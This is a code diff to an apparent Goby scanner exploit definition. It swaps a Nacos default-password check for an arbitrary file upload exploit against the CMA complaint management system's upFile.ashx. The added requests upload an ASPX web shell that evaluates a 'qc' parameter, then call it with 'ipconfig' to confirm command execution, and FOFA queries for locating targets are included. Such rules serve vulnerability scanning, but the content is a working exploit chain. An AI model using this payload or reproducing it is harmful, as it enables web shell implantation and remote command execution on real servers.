@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Alibaba Nacos 默认密码",
+  "Name": "CMA客诉管理系统 upFile.ashx 任意文件上传漏洞",
   "Description": "",
-  "Product": "Nacos",
+  "Product": "",
   "Homepage": "",
-  "DisclosureDate": null,
+  "DisclosureDate": "2023-03-22",
   "Author": "清晨",
-  "FofaQuery": "title=\"Nacos\"",
-  "GobyQuery": "title=\"Nacos\"",
+  "FofaQuery": "title=\"CMA客诉管理系统手机端\"",
+  "GobyQuery": "title=\"CMA客诉管理系统手机端\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -30,16 +30,13 @@ func init() {
     {
       "Request": {
         "method": "POST",
-        "uri": "/nacos/v1/auth/users/login",
+        "uri": "/upFile/upFile.ashx",
         "follow_redirect": true,
         "header": {
-          "Accept": "application/json, text/plain, */*",
-          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-          "Accept-Encoding": "gzip, deflate",
-          "Content-Type": "application/x-www-form-urlencoded"
+          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymXf9pBIUlDVOYtnZ"
         },
         "data_type": "text",
-        "data": "username=nacos&password=nacos"
+        "data": "------WebKitFormBoundarymXf9pBIUlDVOYtnZ\nContent-Disposition: form-data; name=\"file\"; filename=\"abcdef.aspx\"\nContent-Type: application/octet-stream\n\n<% @Page Language=\"Jscript\"%><%eval(Request.Item[\"qc\"],\"unsafe\");%>\n\n------WebKitFormBoundarymXf9pBIUlDVOYtnZ--"
       },
       "ResponseTest": {
         "type": "group",
@@ -56,7 +53,40 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "accessToken",
+            "value": "\"path\":",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "path|lastbody|regex|\"path\":\"/(.*)\""
+      ]
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "{{{path}}}",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": "qc=ipconfig"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "Windows IP",
             "bz": ""
           }
         ]
@@ -69,11 +99,11 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/test.php",
+        "uri": "{{{path}}}",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
-        "data": ""
+        "data": "qc=ipconfig"
       },
       "ResponseTest": {
         "type": "group",
@@ -90,7 +120,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "test",
+            "value": "IPv4",
             "bz": ""
           }
         ]
@@ -112,8 +142,8 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Alibaba Nacos 默认密码",
-      "Product": "Nacos",
+      "Name": "CMA客诉管理系统 upFile.ashx 任意文件上传漏洞",
+      "Product": "",
       "Description": "",
       "Recommendation": "",
       "Impact": "",
@@ -121,7 +151,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Alibaba Nacos Default password",
+      "Name": "CMA upload file",
       "Product": "",
       "Description": "",
       "Recommendation": "",
